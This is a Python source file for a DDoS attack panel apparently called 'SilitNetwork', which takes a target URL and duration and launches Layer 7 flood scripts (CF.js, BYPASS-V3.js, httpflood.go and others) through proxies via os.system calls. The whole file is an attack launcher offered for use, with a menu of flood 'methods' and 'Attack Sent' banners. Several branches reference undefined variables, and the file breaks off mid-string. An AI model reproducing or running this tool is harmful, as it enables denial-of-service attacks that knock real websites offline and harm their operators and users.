import socket
import os
import requests
import random
import getpass
import time
import sys
from termcolor import colored
from colorama import Fore, Back, Style

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

def lod():
	print('Wait!')

def atas():
	sys.stdout.write(Fore.BLUE + '''SilitNetwork Panel-> Stars: [1000] | Users: [0/10] | Methods: [ 20 Methods ]''')
	print("")
	
def gradient_text(text, color1, color2):
    half_length = len(text) // 2
    half1 = colored(text[:half_length], color1)
    half2 = colored(text[half_length:], color2)
    print(half1 + half2)

# Menggunakan fungsi gradient_text untuk mencetak teks "p"
gradient_text('''

▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█
''', "red", "red")

def ohio(text, color1, color2):
    half_length = len(text) // 2
    half1 = colored(text[:half_length], color1)
    half2 = colored(text[half_length:], color2)
    print(half1 + half2)

# Menggunakan fungsi gradient_text untuk mencetak teks "p"
ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [
    Time: [
    Methods: [DEIDARA]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")

def logo():
	clear()
	atas()
	print(""" 
╭━━━┳━━┳╮╱╱╭━━┳━━━━┳━━━┳━━━╮
┃╭━╮┣┫┣┫┃╱╱╰┫┣┫╭╮╭╮┃╭━╮┃╭━╮┃
┃╰━━╮┃┃┃┃╱╱╱┃┃╰╯┃┃╰┫┃╱╰┻╯╭╯┃
╰━━╮┃┃┃┃┃╱╭╮┃┃╱╱┃┃╱┃┃╱╭┳━╯╭╯
┃╰━╯┣┫┣┫╰━╯┣┫┣╮╱┃┃╱┃╰━╯┃┃╰━╮
╰━━━┻━━┻━━━┻━━╯╱╰╯╱╰━━━┻━━━╯
 """)
	
def methods():
	clear()
	logo()
	print("""
Methods/Tools

Layer7
$VIP-TLS [Recommed] 
$GG 
$BYPASS
$NRT
$UAM
$rapid
$TOP-TLS [Recommed] 
$SPIKE
$GOOD
$DSTAT
$CF
$HTTP
$JAWIR
$KOCAK
$ERINA
$ALOK
$OP-DDOS
$NT

Layer 4 
$PAPING
$UDP2
$TCP

Tools
$PROXY [scrape fresh Proxy]

Type "Report" For Report Bug
Type "Owner" Show Information Owner


Perhatikan Besar Kecil Dalam Penulisan Methods!!
""")

def main():
    logo()
    while(True):
        cnc = input('''S͛IͥLIͥᴛⷮCͨ2@root\n ¬>''')
        if cnc == "Methods" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":
            methods()
        if cnc == "Owner" or cnc == "owner" or cnc == "OWNER" or cnc == "OWNERS":
            owner()
        elif cnc == "Report" or cnc == "report" or cnc == "REPORT" or cnc == "REPORS":
            report()
        elif cnc == "Clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
		
# LAYER 7 METHODS

        elif "BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [BYPASS]
    Attack By User: [Linux DDos] 
    
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")   
                os.system(f'cd L7 && node naruto.js {url} 100 1024 {time}')
                os.system(f'cd L7 && node index.js {url} 100 1024 {time}')
                os.system(f'cd L7 && node SPIKE.js {url} 100 {time}')
                os.system(f'cd L7 && node CF.js {url} {time} 100 proxy.txt')
                os.system(f'cd L7 && node BYPASS-V3.js GET {url} proxy.txt {time} 65 3')
                os.system(f'cd L7 && go run httpflood.go {url} 15000 get {time} header.txt')
                os.system(f'cd L7 && node UAM.js {url} {time} 512 100 proxy.txt')
                os.system ("clear")
            except IndexError:
                main()      
                
                
                
                
        elif "NRT" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")    
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [NRT]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node DSTAT.js {url} {time} proxy.txt')
                os.system(f'cd L7 && node HOLD.js {url} {time} 512 100 proxy.txt')
                os.system(f'cd L7 && node SPIKE.js {url} 100 {time}')
                os.system(f'cd L7 && node naruto.js {url} 100 1024 {time}')
                os.system(f'cd L7 && node CF.js {url} {time} 100 proxy.txt')
            except IndexError:
                main()      

                



        elif "GG" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [gg]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node HTTPS-BYPASS.js {url} {time} 100 proxy.txt 1024 bypass')
            except IndexError:
                print('Usage: GG <url> <time>')
                print('Example: GG  http://example.com 60')   
                


        elif "DSTAT" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [DSTAT]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node DSTAT.js {url} {time} proxy.txt')
            except IndexError:
                print('Usage: DSTAT <url> <time>')
                print('Example: DSTAT http://example.com 60')   
                


        



        elif "deidara" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [DEIDARA]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node BYPASS-V3.js GET {url} proxy.txt {time} 512 100')
            except IndexError:
                print('Usage: deidara <url> <time>')
                print('Example: deidara http://example.com 60')         
                                               
        elif "CF" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [CF]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node CF.js {url} {time} 100 proxy.txt')
            except IndexError:
                print('Usage: CF <url> <time>')
                print('Example: CF http://example.com 60')                
                
                 
        elif "JAWIR" in cnc:
            try:
                 url = cnc.split()[1]
                 threads = cnc.split()[2]
                 methode = cnc.split()[3]
                 time = cnc.split()[4]
                 header = cnc.split()[5]
                 os.system(f'go run HTTPS-STORM.go {url} {threads} {methode} {time} {header}')
                 os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                 print('Example: JAWIR https://target.com/ 5000 get 500 header.txt')
                 
        elif "FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
                os.system(f'go run HTTPS-STORM.go {url} {threads} {methode} {time} {header}')
            except IndexError:
                print('Usage: FLOOD <url> <threads> METHODS<GET/POST> <time>')
                
                
        elif "hulk-naruto" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [hulk-naruto]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && go run NARUTO.go -site {url} -data {method}')
            except IndexError:
                print('Usage: hulk-naruto <url> <time>')
                print('Example: hulk-naruto http://example.com 60')                                 
                                
        elif "rapid" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [rapid]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node rapid.js {url} {time} 64 100 proxy.txt')
            except IndexError:
                print('Usage: rapid <url> <time>')
                print('Example: rapid http://example.com 60')                                      

        elif "ERINA" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [ERINA]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node httpsv2.js {url} {time} 120 35 10 proxy.txt bypass')
                os.system(f'cd L7 && node httpsv2.js {url} {time} 120 35 10 proxy.txt bypass ')
            except IndexError:
                print('Usage: ERINA <url> <time>')
                print('Example: ERINA http://example.com 60')                                      
        elif "STRV4" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()[3]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [STRV4]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && go run httpflood.go {url} {threads} get {time} header.txt')
            except IndexError:
                print('Usage: STRV4 <url> <threads> <time>')
                print('Example: STRV4 http://example.com 60 90')
                
                           
        elif "NT" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()[3]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [NT]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node {ur}l {time} 15 proxy.txt 35')
            except IndexError:
                print('Usage: NT <url> <time>')
                print('Example: NT http://example.com 60')
                
       
       
                              
        elif "STRV3" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [STRV3]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node flooder.js {url} {time} 100 proxy.txt 1024 10')
            except IndexError:
                print('Usage: STRV3 <url> <time>')
                print('Example: STRV3 http://example.com 100')                

                              
        elif "GOD-TLS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [GOD-TLS]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node tls.js {url} {time} 120 35 10 proxy.txt')
            except IndexError:
                print('Usage: GOD-TLS <url> <time>')
                print('Example: GOD-TLS http://example.com 100')            

        elif "TLSV1" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
╔═══════════════════════════════════════════════╗

                        
                     
    Target: [''' + url + ''']
    Time: [''' + time + ''']
    Methods: [TLSV1]
   Attack By User: [Linux DDos] 
    
 
╚═══════════════════════════════════════════════╝
''', "yellow", "yellow")
                os.system(f'cd L7 && node index.js {url} 100 1024 {time}')
            except IndexError:
                print('Usage: TLSV1 <url> <time>')
                print('Example: TLSV1 http://example.com 60')    

        elif "VIP-TLS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                gradient_text('''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀▒█▀▀▀█ ▒█░▒█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀▀█ 
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█░░░ ▒█▀▀▀ ░▀▀▀▄▄ 
▒█▄▄▄█ ░▀▄▄▀ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█▄▄▄█ 

░█▀▀█ ▀▀█▀▀ ▀▀█▀▀ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 
▒█▄▄█ ░▒█░░ ░▒█░░ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 
▒█░▒█ ░▒█░░ ░▒█░░ ▒█░▒█ ▒█▄▄█ ▒█░▒█⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                       
                                       

''', "red", "red")
                ohio('''
                    Attack Sent     
